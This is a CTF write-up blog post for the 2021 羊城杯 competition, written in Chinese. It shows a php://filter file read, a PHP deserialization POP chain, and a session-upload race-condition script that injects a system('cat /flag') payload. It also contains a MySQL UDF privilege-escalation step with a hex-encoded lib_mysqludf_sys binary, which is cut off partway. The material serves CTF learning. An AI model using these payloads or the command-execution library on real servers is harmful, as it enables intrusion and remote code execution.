<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">255</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFwp/">羊城杯wp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-12</time><div class="content"><h2 id="Only-4"><a href="#Only-4" class="headerlink" title="Only 4"></a>Only 4</h2><p>有个关键文件serialize.php文件没扫到是真的无语，一直在那里读文件，有个配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?gwht&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;php5&#x2F;apache2&#x2F;php.ini</span><br></pre></td></tr></table></figure>

<p>读完以后发现session_upload_progress默认是开启的，还提高了session路径，所以就使用条件竞争去上传了，但是不知道为啥，我这里一直反弹shell没成功。。。但是学长们成功了~</p>
<p>有一个serialize.php文件，预期解说是扫描出来的，这波是真的难受啊，真的没扫出来我吐了，这次复现就决定复现一下这个预期解了<br>读一下serialize.php，可以直接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1; </span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1; </span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1; </span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$test2,$arr</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1; </span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;å­ç¬¦ä¸²æ¼æ¥&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> highlight_file(<span class="string">&#x27;secret.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造链条</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$test2,$arr</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;å­ç¬¦ä¸²æ¼æ¥&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> highlight_file(<span class="string">&#x27;secret.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> start_gg();</span><br><span class="line">$b=<span class="keyword">new</span> Call();</span><br><span class="line">$c=<span class="keyword">new</span> funct();</span><br><span class="line">$d=<span class="keyword">new</span> func();</span><br><span class="line">$e=<span class="keyword">new</span> string1();</span><br><span class="line">$f=<span class="keyword">new</span> GetFlag();</span><br><span class="line">$e-&gt;str1=$f;</span><br><span class="line">$d-&gt;mod1=$e;</span><br><span class="line">$c-&gt;mod1=$d;</span><br><span class="line">$b-&gt;mod1=$c;</span><br><span class="line">$a-&gt;mod1=$b;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>之后就可以看到secret.php的源码，，发现是有字符长度限制的写shell考点，后面还没来得及做，环境就关了。。。。<br>收藏一下别人的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_flag</span>(<span class="params">s</span>):</span></span><br><span class="line"><span class="keyword">global</span> stop_threads</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> stop_threads:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">url = <span class="string">&#x27;http://192.168.41.134:8000/?</span></span><br><span class="line"><span class="string">gwht=/var/lib/php5/sess_1&amp;ycb=http://127.0.0.1&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=1&#x27;</span>, &#125;</span><br><span class="line">data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat</span></span><br><span class="line"><span class="string">/flag&#x27;);echo &#x27;flag&#x27;;?&gt;&quot;</span>&#125; <span class="comment"># Payload</span></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.txt&#x27;</span>, f)&#125;</span><br><span class="line">rest = s.post(url, headers=headers, data=data, files=files)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(rest.text)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line"><span class="keyword">while</span> thread_num:</span><br><span class="line">thre = threading.Thread(target=run, args=(s,))</span><br><span class="line">thre.start()</span><br><span class="line">thread_list.append(thre)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">t.join()</span><br></pre></td></tr></table></figure>

<h2 id="EasyCurl"><a href="#EasyCurl" class="headerlink" title="EasyCurl"></a>EasyCurl</h2><p>这里主要记录一下没见过的考点:<strong>udf提权</strong><br>首先查看一下插件库的路径:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%plugin%&#39;;</span><br></pre></td></tr></table></figure>

<p>然后将库文件导入到该目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select unhex(&#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000